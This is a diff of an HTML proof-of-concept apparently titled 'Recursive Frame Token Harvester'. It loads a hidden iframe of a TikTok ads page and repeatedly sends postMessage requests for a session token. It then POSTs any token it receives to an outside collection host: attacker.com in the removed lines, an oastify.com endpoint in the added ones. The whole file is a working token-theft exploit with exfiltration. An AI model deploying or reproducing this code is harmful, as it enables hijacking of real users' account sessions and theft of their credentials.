@@ -1,54 +1,30 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Recursive Frame Token Harvester</title>
-</head>
-<body>
-    <iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>
+<iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>
 
-    <script>
-        window.addEventListener('DOMContentLoaded', () => {
-            const iframe = document.getElementById('victim');
+<script>
+    const targetOrigin = "https://ads.tiktok.com";
 
-            iframe.onload = function () {
-                const outerFrame = iframe.contentWindow;
+    document.getElementById('victim').onload = function() {
+        const victimWindow = this.contentWindow;
 
-                // Start recursive postMessage broadcast
-                broadcastToFrames(outerFrame);
-            };
-
-            // Recursive function to go deep into nested frames
-            function broadcastToFrames(frame) {
-                try {
-                    // Send payload to current frame
-                    frame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
-
-                    // Go deeper if there are nested frames
-                    if (frame.frames && frame.frames.length > 0) {
-                        for (let i = 0; i < frame.frames.length; i++) {
-                            broadcastToFrames(frame.frames[i]);
-                        }
-                    }
-                } catch (e) {
-                    console.warn('Cross-origin or inaccessible frame:', e);
-                }
+        // Spam postMessage every 1s to ensure hitting dynamic listeners
+        setInterval(() => {
+            try {
+                victimWindow.postMessage({ action: "getSessionToken" }, targetOrigin);
+            } catch (e) {
+                console.warn("PostMessage failed:", e);
             }
+        }, 1000);
+    };
 
-            // Listen for tokens coming from any frame
-            window.addEventListener('message', (e) => {
-                if (e.origin === 'https://ads.tiktok.com' && e.data) {
-                    console.log('🎯 Token received:', e.data);
+    window.addEventListener('message', (e) => {
+        if (e.origin === targetOrigin && e.data) {
+            console.log("🎯 GOT TOKEN:", e.data);
 
-                    // Optional: Exfiltrate token to your server
-                    fetch('https://attacker.com/collect', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ token: e.data })
-                    });
-                }
+            fetch('https://at7v3ys22asv8q8n1p8e0ylpjgp7dy1n.oastify.com/collect', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({ token: e.data })
             });
-        });
-    </script>
-</body>
-</html>
+        }
+    });
+</script>
